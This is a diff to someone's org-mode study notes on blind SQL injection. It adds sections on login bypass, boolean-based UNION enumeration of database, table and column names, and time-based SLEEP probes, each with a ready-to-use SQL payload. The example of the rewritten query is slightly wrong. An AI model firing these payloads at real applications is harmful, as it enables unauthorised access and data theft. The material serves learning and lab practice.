@@ -5,11 +5,9 @@
 * Table of Contens :toc:
 - [[#what-is-blind-sql-injection][What is Blind SQL Injection]]
 - [[#exploiting-blind-sql-injection-by-triggering-conditional-response][Exploiting Blind SQL injection by triggering conditional response]]
-- [[#error-based-sql-injection][Error-based SQL Injection]]
-- [[#extracting-sensitive-data-via-verbose-sql-error-messages][Extracting sensitive data via verbose SQL error messages]]
-- [[#exploiting-blind-sql-injection-by-triggering-time-delays][Exploiting blind SQL injection by triggering time delays]]
-- [[#exploiting-blind-sql-injection-using-out-of-band-oast-techniques][Exploiting blind SQL injection using out of band (OAST) techniques]]
-- [[#oast][OAST]]
+- [[#authentication-bypass][Authentication Bypass]]
+- [[#boolean-based][Boolean Based]]
+- [[#time-based][Time Based]]
 
 * What is Blind SQL Injection
 Blind SQL injection arises when an application is vulnerable to SQL injeciton, but it's HTTP responses do not contain the results of the relevant SQL query or the details of any database errors
@@ -38,9 +36,50 @@ The first of these values will cause the query to return results, because the in
 *** Lab
 - [[https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses][Blind SQL injection with conditional responses]]
 
+* Authentication Bypass
+In login machanism
+#+begin_src sql
+  select * from users where username='%username%' and password='%password%' LIMIT 1;
+#+end_src
+=%username%= and =%password%= values are take from the login form. To make this into a query that always return true, we can enter into password field
+#+begin_src sql
+ ' OR 1=1;-- 
+#+end_src
+Which turn the SQL query into
+#+begin_src sql
+ select * from users where username='%username%' and password='%password%' OR 1=1; 
+#+end_src
+Since 1=1 always true and use or operator so this query will always return true
 
-* Error-based SQL Injection
-* Extracting sensitive data via verbose SQL error messages
-* Exploiting blind SQL injection by triggering time delays
-* Exploiting blind SQL injection using out of band (OAST) techniques
-* OAST
+* Boolean Based
++ determine number of columns
+#+begin_src sql
+ admin123' UNION SELECT 1;-- 
+#+end_src
+/increase until succeed/
+#+begin_src sql
+ admin123' UNION SELECT 1,2,3;-- 
+#+end_src
++ retrieve database name
+#+begin_src sql
+admin123' UNION SELECT 1,2,3 where database() like 's%';--
+#+end_src
++ retreive table name
+#+begin_src sql
+ admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';-- 
+#+end_src
++ retrieve column name
+#+begin_src sql
+  admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
+#+end_src
+* Time Based
+- similar to boolean based query
+- indicator of a correct query is based on the time the query takes to complete.
+- determine the number of column
+#+begin_src sql
+admin12' UNION SELECT SLEEP(5);--
+#+end_src
+/if there is no pause in the response time, we know the query was unsuccessful, so have to add another column/
+#+begin_src sql
+ admin12' UNION SELECT SLEEP(5),2;--
+#+end_src
